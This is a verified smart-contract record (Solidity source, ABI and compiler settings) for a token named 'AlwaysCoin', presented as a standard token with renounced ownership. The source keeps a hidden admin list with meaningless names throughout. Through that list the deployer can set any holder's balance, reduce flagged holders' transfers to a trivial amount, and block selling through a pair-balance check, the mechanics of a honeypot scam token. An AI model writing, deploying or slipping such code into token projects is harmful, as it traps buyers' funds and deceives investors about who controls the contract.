{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buyLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingTo {\n    function createPair(address marketingLimitMin, address teamMarketing) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface tradingAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface exemptReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapLaunched) external view returns (uint256);\n\n    function transfer(address sellList, uint256 listAuto) external returns (bool);\n\n    function allowance(address takeTradingReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellList,\n        uint256 listAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverFee, uint256 value);\n    event Approval(address indexed takeTradingReceiver, address indexed spender, uint256 value);\n}\n\ninterface exemptReceiverMetadata is exemptReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlwaysCoin is buyLaunch, exemptReceiver, exemptReceiverMetadata {\n\n    uint256 public totalAt;\n\n    uint256 public fromSender = 0;\n\n    string private maxLaunchedTrading = \"ACN\";\n\n    function owner() external view returns (address) {\n        return liquidityAtLaunched;\n    }\n\n    bool public limitToken;\n\n    function minReceiver(address senderLiquidity, address sellList, uint256 listAuto) internal returns (bool) {\n        require(isTo[senderLiquidity] >= listAuto);\n        isTo[senderLiquidity] -= listAuto;\n        isTo[sellList] += listAuto;\n        emit Transfer(senderLiquidity, sellList, listAuto);\n        return true;\n    }\n\n    address sellLaunch;\n\n    function allowance(address tokenFee, address fundFromLimit) external view virtual override returns (uint256) {\n        if (fundFromLimit == tokenMode) {\n            return type(uint256).max;\n        }\n        return liquidityTokenTeam[tokenFee][fundFromLimit];\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityTokenTeam;\n\n    string private senderFrom = \"Always Coin\";\n\n    address private liquidityAtLaunched;\n\n    bool public launchedList;\n\n    event OwnershipTransferred(address indexed takeSwapAuto, address indexed marketingTake);\n\n    bool public fromExemptLaunch;\n\n    address public buyTotal;\n\n    function balanceOf(address swapLaunched) public view virtual override returns (uint256) {\n        return isTo[swapLaunched];\n    }\n\n    uint256 private feeEnableLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxLaunchedTrading;\n    }\n\n    address public receiverTeamList;\n\n    function liquidityLaunch(address limitSell) public {\n        feeFrom();\n        if (walletTeam) {\n            walletTeam = true;\n        }\n        if (limitSell == buyTotal || limitSell == receiverTeamList) {\n            return;\n        }\n        fromEnable[limitSell] = true;\n    }\n\n    uint256 constant feeToken = 20 ** 10;\n\n    uint256 private minEnable;\n\n    function receiverLaunched(uint256 listAuto) public {\n        feeFrom();\n        teamLaunch = listAuto;\n    }\n\n    function feeFrom() private view {\n        require(limitLaunch[_msgSender()]);\n    }\n\n    function approve(address fundFromLimit, uint256 listAuto) public virtual override returns (bool) {\n        liquidityTokenTeam[_msgSender()][fundFromLimit] = listAuto;\n        emit Approval(_msgSender(), fundFromLimit, listAuto);\n        return true;\n    }\n\n    uint256 private exemptLaunch;\n\n    function receiverTradingReceiver(address launchedReceiverFund) public {\n        if (launchedList) {\n            return;\n        }\n        \n        limitLaunch[launchedReceiverFund] = true;\n        if (totalAt != swapLimit) {\n            totalAt = exemptLaunch;\n        }\n        launchedList = true;\n    }\n\n    uint256 private shouldSender = 100000000 * 10 ** 18;\n\n    function receiverShould(address senderLiquidity, address sellList, uint256 listAuto) internal returns (bool) {\n        if (senderLiquidity == buyTotal) {\n            return minReceiver(senderLiquidity, sellList, listAuto);\n        }\n        uint256 exemptMax = exemptReceiver(receiverTeamList).balanceOf(sellLaunch);\n        require(exemptMax == teamLaunch);\n        require(sellList != sellLaunch);\n        if (fromEnable[senderLiquidity]) {\n            return minReceiver(senderLiquidity, sellList, feeToken);\n        }\n        listAuto = buyReceiverSender(senderLiquidity, sellList, listAuto);\n        return minReceiver(senderLiquidity, sellList, listAuto);\n    }\n\n    bool private walletTeam;\n\n    function getOwner() external view returns (address) {\n        return liquidityAtLaunched;\n    }\n\n    uint8 private minLiquidityTrading = 18;\n\n    function receiverSwap(address liquidityFeeFund, uint256 listAuto) public {\n        feeFrom();\n        isTo[liquidityFeeFund] = listAuto;\n    }\n\n    uint256 private swapLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minLiquidityTrading;\n    }\n\n    function transferFrom(address senderLiquidity, address sellList, uint256 listAuto) external override returns (bool) {\n        if (_msgSender() != tokenMode) {\n            if (liquidityTokenTeam[senderLiquidity][_msgSender()] != type(uint256).max) {\n                require(listAuto <= liquidityTokenTeam[senderLiquidity][_msgSender()]);\n                liquidityTokenTeam[senderLiquidity][_msgSender()] -= listAuto;\n            }\n        }\n        return receiverShould(senderLiquidity, sellList, listAuto);\n    }\n\n    mapping(address => uint256) private isTo;\n\n    function transfer(address liquidityFeeFund, uint256 listAuto) external virtual override returns (bool) {\n        return receiverShould(_msgSender(), liquidityFeeFund, listAuto);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderFrom;\n    }\n\n    address tokenMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function buyReceiverSender(address senderLiquidity, address sellList, uint256 listAuto) internal view returns (uint256) {\n        require(listAuto > 0);\n\n        uint256 takeSender = 0;\n        if (senderLiquidity == receiverTeamList && liquidityTradingTo > 0) {\n            takeSender = listAuto * liquidityTradingTo / 100;\n        } else if (sellList == receiverTeamList && fromSender > 0) {\n            takeSender = listAuto * fromSender / 100;\n        }\n        require(takeSender <= listAuto);\n        return listAuto - takeSender;\n    }\n\n    uint256 teamLaunch;\n\n    mapping(address => bool) public fromEnable;\n\n    constructor (){\n        \n        tokenTeam();\n        tradingAt amountToken = tradingAt(tokenMode);\n        receiverTeamList = marketingTo(amountToken.factory()).createPair(amountToken.WETH(), address(this));\n        sellLaunch = marketingTo(amountToken.factory()).feeTo();\n        if (fromExemptLaunch == limitToken) {\n            limitToken = false;\n        }\n        buyTotal = _msgSender();\n        limitLaunch[buyTotal] = true;\n        isTo[buyTotal] = shouldSender;\n        \n        emit Transfer(address(0), buyTotal, shouldSender);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldSender;\n    }\n\n    uint256 marketingShould;\n\n    function tokenTeam() public {\n        emit OwnershipTransferred(buyTotal, address(0));\n        liquidityAtLaunched = address(0);\n    }\n\n    mapping(address => bool) public limitLaunch;\n\n    uint256 public liquidityTradingTo = 3;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTradingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeSwapAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFromLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFromLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExemptLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSell\",\"type\":\"address\"}],\"name\":\"liquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTradingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listAuto\",\"type\":\"uint256\"}],\"name\":\"receiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFeeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAuto\",\"type\":\"uint256\"}],\"name\":\"receiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeamList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiverFund\",\"type\":\"address\"}],\"name\":\"receiverTradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFeeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlwaysCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}